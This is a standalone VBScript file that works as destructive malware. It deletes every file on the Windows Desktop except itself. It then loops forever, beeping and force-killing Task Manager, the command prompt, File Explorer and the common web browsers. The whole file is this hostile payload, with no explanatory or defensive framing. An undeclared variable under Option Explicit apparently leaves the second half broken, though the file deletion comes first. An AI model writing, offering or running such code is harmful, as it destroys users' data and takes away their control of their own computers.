Option Explicit

Dim objFSO, objFolder, objFile, strVBScript

' Create a FileSystemObject
Set objFSO = CreateObject("Scripting.FileSystemObject")

' Get the Desktop folder
Set objFolder = objFSO.GetFolder(WScript.CreateObject("WScript.Shell").SpecialFolders("Desktop"))

' Get the path of this VBScript file
strVBScript = WScript.ScriptFullName

' Loop through each file in the Desktop folder and delete it, except for this VBScript file
For Each objFile In objFolder.Files
    If objFile.Path <> strVBScript Then
        objFSO.DeleteFile(objFile)
    End If
Next

Set objFile = Nothing
Set objFolder = Nothing
Set objFSO = Nothing

Set objShell = CreateObject("WScript.Shell")

Do While True
    ' Play a beep sound
    objShell.Run "PowerShell -Command ""[System.Media.SystemSounds]::Beep.Play()""", 0, True

    ' Close Task Manager
    objShell.Run "taskkill /f /im taskmgr.exe", 0, True

    ' Close Command Prompt
    objShell.Run "taskkill /f /im cmd.exe", 0, True

    ' Close File Explorer
    objShell.Run "taskkill /f /im explorer.exe", 0, True

    ' Close any browser
    objShell.Run "taskkill /f /im chrome.exe", 0, True
    objShell.Run "taskkill /f /im firefox.exe", 0, True
    objShell.Run "taskkill /f /im iexplore.exe", 0, True

    ' Wait for a second
    WScript.Sleep 1000
Loop
